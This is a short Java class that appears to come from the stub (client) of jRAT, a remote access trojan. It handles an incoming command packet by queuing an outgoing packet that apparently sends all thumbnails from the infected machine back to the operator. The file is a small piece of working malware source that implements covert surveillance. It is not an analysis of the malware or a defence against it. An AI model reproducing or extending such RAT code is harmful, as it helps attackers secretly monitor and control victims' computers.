package su.jrat.stub.packets.incoming;

import su.jrat.stub.Connection;
import su.jrat.stub.packets.outgoing.Packet71AllThumbnails;

public class Packet75AllThumbnails extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {		
		Connection.addToSendQueue(new Packet71AllThumbnails());
	}

}
